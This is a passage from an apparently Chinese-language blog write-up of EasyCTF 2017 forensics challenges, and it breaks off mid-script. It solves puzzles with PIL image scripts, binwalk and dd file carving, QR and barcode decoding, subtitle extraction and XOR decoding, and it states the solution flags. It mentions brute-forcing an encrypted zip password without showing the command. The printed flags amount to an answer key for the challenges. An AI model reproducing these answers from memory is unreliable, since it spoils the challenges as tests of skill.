class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"file1.txt"</span>) <span class="keyword">as</span> file1:</div><div class="line">       str1 = file1.read()</div><div class="line">   <span class="keyword">with</span> open(<span class="string">"file2.txt"</span>) <span class="keyword">as</span> file2:</div><div class="line">       str2 = file2.read()</div><div class="line">   str1_diff = <span class="string">''</span></div><div class="line">   str2_diff = <span class="string">''</span></div><div class="line">   <span class="keyword">for</span> x <span class="keyword">in</span> range(len(str1)):</div><div class="line">       <span class="keyword">if</span> str1[x] != str2[x]:</div><div class="line">           str1_diff = str1_diff + str1[x]</div><div class="line">           str2_diff = str2_diff + str2[x]</div><div class="line">   print(str1_diff)</div><div class="line">   print(str2_diff)</div><div class="line">   print(<span class="string">"flag:%s"</span> %str1_diff[::<span class="number">-1</span>])</div></pre></td></tr></table></figure><h2 id="Flag-Collection"><a href="#Flag-Collection" class="headerlink" title="Flag Collection"></a>Flag Collection</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Here’s a <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/flag-collection/flags.zip" target="_blank" rel="external">collection of flags</a>! I think you’re looking for a specific one, though…</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p><a href="http://baike.baidu.com/item/Thumbs.db" target="_blank" rel="external">Thumbs.db</a><br><a href="https://thumbsviewer.github.io/" target="_blank" rel="external">thumbs viewer</a></p><p><img src="http://i.imgur.com/vYwDd3E.png" alt=""></p><pre><code>easyctf{thumbs.db_c4n_b3_useful}
</code></pre><h2 id="Zooooooom"><a href="#Zooooooom" class="headerlink" title="Zooooooom"></a>Zooooooom</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/zooooooom/hekkerman.jpg" target="_blank" rel="external">Hekkerman</a> is looking awfully spooky. That hekker glare could pierce a firewall. What can he see that you can’t?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p>图片由三张图片合并拼接而成，分别分离出得到flag：</p><p><img src="http://i.imgur.com/bnPjwVx.jpg" alt=""></p><h2 id="Gibberish"><a href="#Gibberish" class="headerlink" title="Gibberish"></a>Gibberish</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>I have no idea what <a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Gibberish/gibberish.png" target="_blank" rel="external">this</a> image is, but my sources tell me that it contains something useful, a flag perhaps? Can you help me find it?<br>There are 3 parts to the flag. There are 3 colors of the rainbow. My flag will never expire.<br>Hint：Presence is more important than intensity. Everything is simply boolean. One of the parts requires a scanner.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p>这题要仔细审题，给了很多信息，提示flag由三部分组成，又说了三种颜色，只给了一张24位的图片：</p><p><img src="http://i.imgur.com/jGcJEOr.png" alt=""></p><p>很容易联想到图像的R,G,B分离处理，打开PS把图像的R,G,B通道分离得到：</p><p>R通道：</p><p><img src="http://i.imgur.com/1SFKsKU.png" alt=""></p><p>G通道：</p><p><img src="http://i.imgur.com/RsbzzJW.png" alt=""></p><p>B通道：</p><p><img src="http://i.imgur.com/xb8XnAb.png" alt=""></p><p>题目又提示其中一张需要扫描器，综合来看3张图片有张可能是条形码，于是PS中反相，不断锐化，然后将线条填充完整，类似这样：</p><p><img src="http://i.imgur.com/2b0x2P6.png" alt=""></p><p>不过这样太麻烦，于是写个脚本自动处理图像：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageEnhance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert</span><span class="params">(im)</span>:</span></div><div class="line">    im = im.convert(<span class="string">"L"</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    width = im.size[<span class="number">0</span>]</div><div class="line">    height = im.size[<span class="number">1</span>]</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">            pixel[x, y] = <span class="number">255</span> - pixel[x, y]</div><div class="line">    <span class="keyword">return</span> im</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">enhance</span><span class="params">(im)</span>:</span></div><div class="line">    im = ImageEnhance.Contrast(im).enhance(<span class="number">10.0</span>)</div><div class="line">    <span class="keyword">return</span> im</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(im)</span>:</span></div><div class="line">    im = im.convert(<span class="string">"L"</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    width = im.size[<span class="number">0</span>]</div><div class="line">    height = im.size[<span class="number">1</span>]</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">if</span>((pixel[x, <span class="number">0</span>] != <span class="number">255</span>) <span class="keyword">or</span> (pixel[x, <span class="number">21</span>] != <span class="number">255</span>) <span class="keyword">or</span> (pixel[x, <span class="number">43</span>] != <span class="number">255</span>)):</div><div class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">                pixel[x, y] = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> im</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    im = Image.open(<span class="string">'cea3386a382bfad628a3c5edf8d61a9285ab0290_gibberish.png'</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    channels = [<span class="string">'r'</span>, <span class="string">'g'</span>, <span class="string">'b'</span>]</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> im_channel <span class="keyword">in</span> im.split():</div><div class="line">        im_invert = invert(im_channel)</div><div class="line">        im_enhance = enhance(im_invert)</div><div class="line">        im_fill = fill(im_enhance)</div><div class="line">        im_fill.save(<span class="string">'im_'</span> + channels[i] +<span class="string">'.png'</span>)</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>处理后分别得到R,G,B通道的图像</p><p><img src="http://i.imgur.com/YwJ14jb.png" alt=""></p><p><img src="http://i.imgur.com/rr5l71e.png" alt=""></p><p><img src="http://i.imgur.com/ACCUIou.png" alt=""></p><p>处理后G通道最有可能是条形码，多次扫描终于（<a href="http://www.coolapk.com/apk/com.google.zxing.client.android" target="_blank" rel="external">条码扫描器Barcode Scanner</a>）：</p><p><img src="http://i.imgur.com/m82TvZV.jpg" alt=""></p><p>得到8个字符:<code>LH5i6uQz</code></p><p>那其他两张图像怎么处理呢，提示说任何事物都是简单的二进制，开脑洞想到可能是黑白颜色代表二进制的1，0，于是提取图像的首行像素转换二进制串再转换为字符串：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">import</span> libnum</div><div class="line"></div><div class="line">im_b = Image.open(<span class="string">'im_b.png'</span>)</div><div class="line">im_r = Image.open(<span class="string">'im_r.png'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">image2ascii</span><span class="params">(im)</span>:</span></div><div class="line">    im = im.convert(<span class="string">"L"</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    width = im.size[<span class="number">0</span>]</div><div class="line">    bits = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">if</span>(pixel[x, <span class="number">0</span>] == <span class="number">255</span>):</div><div class="line">            bits += <span class="string">"0"</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            bits += <span class="string">"1"</span></div><div class="line">    print(libnum.b2s(bits))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    image2ascii(im_r)</div><div class="line">    image2ascii(im_b)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>也是得到了两组8个字符：</p><pre><code>aPgMasSt
5U5EYz2b
</code></pre><p>一开始以为三个部分组合可能是base64，但是怎么组合都不对，陷入江局，又看了N遍题目，说我的flag永远不会过期，GG搜索N久才发现说的是<a href="http://www.appinn.com/pastebin/" target="_blank" rel="external">pastebin</a>。<code>程序员的世界你不懂，他们已经占领了 github，但我们还有 PasteBin。</code></p><p><img src="http://i.imgur.com/Q7T2VOs.png" alt=""></p><p>而你分享的内容会自动生成一个8字符的链接，这脑洞也是服，最后得到网址：</p><ul><li><a href="http://pastebin.com/LH5i6uQz" target="_blank" rel="external">http://pastebin.com/LH5i6uQz</a></li><li><a href="http://pastebin.com/LH5i6uQz" target="_blank" rel="external">http://pastebin.com/aPgMasSt</a></li><li><a href="http://pastebin.com/LH5i6uQz" target="_blank" rel="external">http://pastebin.com/5U5EYz2b</a></li></ul><p>组合得到：<code>easyctf{col0rs_b4rcod3s_and_b1nary_f?n}</code><br>激动地一提交，结果不对，仔细又开打链接检查，才发现flag里有个问号，可能是让猜测，填个u试试（<code>fun</code>），终于get Orz。</p><h2 id="QR1"><a href="#QR1" class="headerlink" title="QR1"></a>QR1</h2><h2 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h2><p>I just saw this QR code the other day, but couldn’t tell what data it has. Can you help? <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/qr-1/qr1.bmp" target="_blank" rel="external">Here</a> it is.</p><p>Hint:Is the image only black and white?</p><h2 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h2><p><img src="http://i.imgur.com/JXa15my.png" alt=""></p><p>首先看到二维码的定位标识被反相处理了，题目还提示了说图像只有黑色和白色吗，于是推测图像可能不止黑白两种颜色，于是打开PS不断锐化原图像果然发现一些接近黑色的颜色被暴露：</p><p><img src="http://i.imgur.com/VW7Guej.png" alt=""></p><p>需要把接近黑色的颜色画成黑色，手动画图挺麻烦还是上脚本：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(image)</span>:</span></div><div class="line">    pixels = image.load()</div><div class="line">    width = image.size[<span class="number">0</span>]</div><div class="line">    height = image.size[<span class="number">1</span>]</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">            <span class="keyword">if</span> (pixels[x, y] != <span class="number">255</span>):</div><div class="line">                <span class="keyword">if</span> pixels[x, y] &lt; <span class="number">125</span>:</div><div class="line">                    pixels[x, y] = <span class="number">0</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    pixels[x, y] = <span class="number">255</span></div><div class="line">    <span class="keyword">return</span> image</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    image = Image.open(<span class="string">'qr1.bmp'</span>)</div><div class="line">    image = image.convert(<span class="string">'L'</span>)</div><div class="line">    processed_image = process(image)</div><div class="line">    processed_image.save(<span class="string">'solved.bmp'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>得到处理后的图像：</p><p><img src="http://i.imgur.com/uYsm0HM.png" alt=""></p><p>接下来对定位标识进行反相处理：</p><p><img src="http://i.imgur.com/d304P3b.png" alt=""></p><pre><code>easyctf{n0w_who-w0u1d_do_thAT_to_Th3ir_QR?}
</code></pre><h2 id="Ogrewatch"><a href="#Ogrewatch" class="headerlink" title="Ogrewatch"></a>Ogrewatch</h2><h3 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h3><p>My friend was out watching ogres when he heard a strange sound. Could you figure out what it means? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/ogrewatch/ogreman" target="_blank" rel="external">ogreman</a><br>Hint：If you’re having trouble with the file format, Gary Kessler might help.</p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><pre><code>root@kali:~/Desktop# file ogreman 
ogreman: Matroska data
</code></pre><p>在了解一波<a href="http://www.cnblogs.com/loleng/articles/2032722.html" target="_blank" rel="external">MATROSKA 文件格式</a><br>给文件加上<code>.mka</code>后缀后使用Pot Player播放时有字幕一闪而过：</p><p><img src="http://i.imgur.com/ZamTYr0.png" alt=""></p><p>于是使用MATROSKA文件处理工具<a href="https://mkvtoolnix.download/downloads.html" target="_blank" rel="external">MKVToolNix</a>中的mkvextract将字幕导出：</p><p><img src="http://i.imgur.com/gWQ2Fc4.png" alt=""></p><p><img src="http://i.imgur.com/LRG3Pri.png" alt=""></p><pre><code>λ mkvextract.exe tracks 132ea90b28084ca59d251988faeecf40e4879b98_ogreman 2:zimu
</code></pre><p><img src="http://i.imgur.com/2UEtJ9u.png" alt=""></p><p><img src="http://i.imgur.com/7giXxDP.png" alt=""></p><p>将有flag的部分提取出来单独处理：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>) <span class="keyword">as</span> file:</div><div class="line">    lines_list = file.readlines()</div><div class="line">    flag = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines_list:</div><div class="line">        flag = flag + line[<span class="number">50</span>]</div><div class="line">    print(flag) <span class="comment"># easyctf&#123;subs_r_b3tt3r_th@n_dub5&#125;</span></div></pre></td></tr></table></figure><p></p><h2 id="Flag-PEG"><a href="#Flag-PEG" class="headerlink" title="Flag PEG"></a>Flag PEG</h2><h3 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h3><p>We found a flag but it didn’t do anything. Maybe you can find a better <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/flag-peg/heresaflag.jpg" target="_blank" rel="external">flag</a>?<br>You’re not looking deep enough.</p><h3 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h3><pre><code>sunnyelf@ubuntu:~/Desktop$ binwalk -v heresaflag 

Scan Time:     2017-03-26 09:29:30
Target File:   /home/sunnyelf/Desktop/heresaflag
MD5 Checksum:  890fad720c23e53f4698ac04bc5f9a23
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, big-endian, offset of first image directory: 8
18357         0x47B5          Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&quot;&gt; &lt;rdf:Description rdf:about=&quot;&quot; xmlns:xmpMM=&quot;http://ns.adobe.com/xap/1.0/mm/&quot; xmlns:stEvt=
341939        0x537B3         7-zip archive data, version 0.3
</code></pre><hr><pre><code>sunnyelf@ubuntu:~/Desktop$ dd if=heresaflag of=1.7z skip=341939 bs=1
记录了156772+0 的读入
记录了156772+0 的写出
156772 bytes (157 kB, 153 KiB) copied, 0.211627 s, 741 kB/s
</code></pre><hr><pre><code>sunnyelf@ubuntu:~/Desktop$ 7z e 1.7z 

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,1 CPU)

Processing archive: 1.7z

Extracting  KHgrbikqKC0xKV5u

Everything is Ok

Size:       155553
Compressed: 156772
</code></pre><hr><pre><code>sunnyelf@ubuntu:~/Desktop$ python -c &quot;import base64;print base64.b64decode(&apos;KHgrbikqKC0xKV5u&apos;)&quot;
(x+n)*(-1)^n
</code></pre><p>看到<code>(x+n)*(-1)^n</code>可能是加密算法，而<code>KHgrbikqKC0xKV5u</code>文件可能就是已加密的文件，先拖进Hex Editor Neo看看：</p><p><img src="http://i.imgur.com/EnpPx3p.png" alt=""></p><p>看到第一个字节是0x89第一反应可能png的头，推测该加密的文件原文件是png文件，如果x表示字节内容，n表示顺序的话简单地来验证一下（0x89 = 137）：<code>（137+0）*(-1)^0=137</code>，果然计算结果相同，那么把png文件头都使用<code>(x+n)*(-1)^n</code>加密再和已加密的文件对比一下呢：</p><p><img src="http://i.imgur.com/C8uOGMA.png" alt=""></p><p>结果发现规律，png文件头上的偶数位字节数值（从0开始数起）加密计算后总是与给的文件偶数位上字节数值相等，png文件头上的奇数位字节数值加密后与给的文件奇数位上的字节数值满足一种关系：给的文件奇数位上的字节数值减去经过加密的数值恒等于256，比如<code>175-(-81)=256</code> <code>182-(-74)=256</code>，如果<code>y=(x+n)*(-1)^n</code>，那么<code>x=y/(-1)^n-n</code> ，注意计算结果可能为负值，所以要模256，所以接下来就交给脚本：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">	decrypt_data = <span class="string">''</span></div><div class="line">	<span class="keyword">with</span> open(<span class="string">'KHgrbikqKC0xKV5u'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> encrypted_file:</div><div class="line">	    n = <span class="number">0</span></div><div class="line">	    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	        byte = encrypted_file.read(<span class="number">1</span>)</div><div class="line">	        <span class="keyword">if</span> <span class="keyword">not</span> byte:</div><div class="line">	            <span class="keyword">break</span></div><div class="line">	        d = ord(byte)</div><div class="line">	        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">	            y = d</div><div class="line">	            x = (y / ((<span class="number">-1</span>) ** n) - n) % <span class="number">256</span></div><div class="line">	            decrypt_data += chr(x)</div><div class="line">	        <span class="keyword">else</span>:</div><div class="line">	            y = (d - <span class="number">256</span>)</div><div class="line">	            x = (y / ((<span class="number">-1</span>) ** n) - n) % <span class="number">256</span></div><div class="line">	            decrypt_data += chr(x)</div><div class="line">	        n += <span class="number">1</span></div><div class="line">	</div><div class="line">	<span class="keyword">with</span> open(<span class="string">'decrypt_file.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> decrypt_file:</div><div class="line">	    decrypt_file.write(decrypt_data)</div><div class="line"></div><div class="line">![](http://i.imgur.com/pa2rb5b.png)</div></pre></td></tr></table></figure><p></p><h2 id="My-USB"><a href="#My-USB" class="headerlink" title="My USB"></a>My USB</h2><h3 id="problem-10"><a href="#problem-10" class="headerlink" title="problem"></a>problem</h3><p>I found my <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/my-usb/usb.img" target="_blank" rel="external">usb</a> from a long time ago. I know there’s a flag on there somewhere; can you help me find it?</p><h3 id="solution-9"><a href="#solution-9" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">    root@kali:~/Desktop<span class="comment"># mv 2c370b79d147127064f019dcb05bba1aa917c552_usb.img usb.img</span></div><div class="line">    root@kali:~/Desktop<span class="comment"># binwalk -v usb.img </span></div><div class="line">    root@kali:~/Desktop<span class="comment"># foremost usb.img</span></div><div class="line"></div><div class="line">![](http://i.imgur.com/XCcilKC.jpg)</div></pre></td></tr></table></figure><h2 id="Finn"><a href="#Finn" class="headerlink" title="Finn"></a>Finn</h2><h3 id="problem-11"><a href="#problem-11" class="headerlink" title="problem"></a>problem</h3><p>The Resistance intercepted this suspicious <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/finn/finn.jpg" target="_blank" rel="external">picture</a> of Finn’s old stormtrooper helmet, sent by General Hux to Kylo Ren. Hux isn’t exactly Finn’s biggest fan. What could he be hiding? Good luck!</p><p>If you get stuck, We also have <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/finn/help.txt" target="_blank" rel="external">this</a> blob of sarcasm, which may or may not be useful in your quest. Worth a shot right?</p><p>Hint：In hindsight, numerical pins make really bad passwords . . . especially if they are pop culture references, also some pixels differ by more than one</p><pre><code>Everyone complains that my problems are too random. Fine. Here is EXACTLY how to solve this problem.

1. Wow I have an image. I wonder why it’s so big (read: grandma, what large eyes you have)
2. So I figured that part out. Great, there’s a password. I wonder what that has to do with this image. Or wait, I could just brute force it, right? Either way works. It’s called reading the problem description. Or even the title. Titles do matter.
3. Yay, 2 images. What’s the difference? Hmmmm, I wonder what would happen if I ressed that difference pictorially. 
4. Well I got some stuff, but it makes no sense. Oh wait, maybe I need a key! Let’s go back to that thing we extracted earlier, shall we? Maybe those discrepancies are ACTUALLY USEFUL. Nothing is an accident, not even random out of place pixels. Check them. Carefully.
5. What do I do with this message and key? How about, the most obvious thing in every CTF ever. Seriously.

So you got the flag. Congrats! See, it wasn’t that bad.
</code></pre><h3 id="solution-10"><a href="#solution-10" class="headerlink" title="solution"></a>solution</h3><pre><code>root@kali:~/Desktop# file finn.jpg 
finn.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 118x118, segment length 16, baseline, precision 8, 630x630, frames 3
root@kali:~/Desktop# binwalk -v finn.jpg 

Scan Time:     2017-03-27 03:53:23
Target File:   /root/Desktop/finn.jpg
MD5 Checksum:  e09ee29407ca1b68db84dae5be8a52d4
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
44350         0xAD3E          Zip archive data, at least v1.0 to extract, name: kylo/
44413         0xAD7D          Zip archive data, encrypted at least v2.0 to extract, compressed size: 3489072, uncompressed size: 3488525, name: kylo/kylo1.png
3533573       0x35EB05        Zip archive data, encrypted at least v2.0 to extract, compressed size: 3489495, uncompressed size: 3488948, name: kylo/kylo2.png
7023399       0x6B2B27        End of Zip archive

root@kali:~/Desktop# foremost finn.jpg 
Processing: finn.jpg
|foundat=kylo/UT    
foundat=kylo/kylo1.pngUT*|
</code></pre><p>得到一个加密的zip，尝试暴力破解：</p><p><img src="http://i.imgur.com/3px1Yhk.png" alt=""></p><p>解压得到两种表面上相似的png图片，使用Stegsolve对比检测，当浏览到sub模式时：</p><p><img src="http://i.imgur.com/IxCNgBH.png" alt=""></p><p>扫码得到26个hex值：<code>\x63\x68\x66\x63\x7e\x71\x73\x34\x76\x57\x72\x3c\x74\x73\x5c\x31\x75\x5d\x6b\x32\x34\x77\x59\x38\x4c\x7f</code>，尝试解码得到<code>chfc~qs4vWr&lt;ts\1u]k24wY8L</code>，结果不是flag，根据提示又看比较出来的二维码左下角貌似多了一些像素，于是在PS中对比才发现还有一些像素stegsolve没有提取出来：</p><p><img src="http://i.imgur.com/LKgx5FB.png" alt=""></p><p><img src="http://i.imgur.com/kp064eW.png" alt=""></p><p>刚好26个像素，将它们的灰度值提取出来：<code>5,4,7,4,5,2,7,0,4,8,5,8,6,0,3,0,6,2,9,1,1,3,6,2,8,2</code>，写个脚本异或看看：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">a = [<span class="number">0x63</span>,<span class="number">0x68</span>,<span class="number">0x66</span>,<span class="number">0x63</span>,<span class="number">0x7e</span>,<span class="number">0x71</span>,<span class="number">0x73</span>,<span class="number">0x34</span>,<span class="number">0x76</span>,<span class="number">0x57</span>,<span class="number">0x72</span>,<span class="number">0x3c</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x5c</span>,<span class="number">0x31</span>,<span class="number">0x75</span>,<span class="number">0x5d</span>,<span class="number">0x6b</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x77</span>,<span class="number">0x59</span>,<span class="number">0x38</span>,<span class="number">0x4c</span>,<span class="number">0x7f</span>]</div><div class="line">b = [<span class="number">5</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>]</div><div class="line">c = []</div><div class="line">d = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(len(a)):</div><div class="line">	c.append(a[x] ^ b[x])</div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(len(c)):</div><div class="line">	d += chr(c[y])</div><div class="line">print(d) <span class="comment"># flag&#123;st4r_w4rs_1s_b35t_:D&#125;</span></div></pre></td></tr></table></figure><p></p><h2 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h2><h3 id="problem-12"><a href="#problem-12" class="headerlink" title="problem"></a>problem</h3><p>I was listening to <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/serial/serial.wav" target="_blank" rel="external">this</a> haystack, but I didn’t notice anything. What did I miss?</p><p>hint: 010100110110010101110010011010010110000101101100001011100010111000101110</p><h3 id="solution-11"><a href="#solution-11" class="headerlink" title="solution"></a>solution</h3><p><a href="https://writeups.easyctf.com/forensics/serial-300-points.html" target="_blank" rel="external">writeup</a></p><h2 id="Decomphose"><a href="#Decomphose" class="headerlink" title="Decomphose"></a>Decomphose</h2><h3 id="problem-13"><a href="#problem-13" class="headerlink" title="problem"></a>problem</h3><p>Image arithmetic is super neat until there’s more than two images involved.</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 1</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 2</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 3</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 4</a></p><h3 id="solution-12"><a href="#solution-12" class="headerlink" title="solution"></a>solution</h3><p>给了4个压缩包，分别解压一共得到48张类似这样的图片：</p><p><img src="http://i2.muimg.com/589513/2dc8a42fc304928d.png" alt=""></p><p>放大可以看到一些像素被周围黑色像素包围，其他的图片打开放大看也是这种情况，所以尝试把所有图片中被黑色像素包围的像素提取到一张图片上看看：</p><p><img src="http://i2.muimg.com/589513/6310820be44f7c7e.png" alt=""><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> 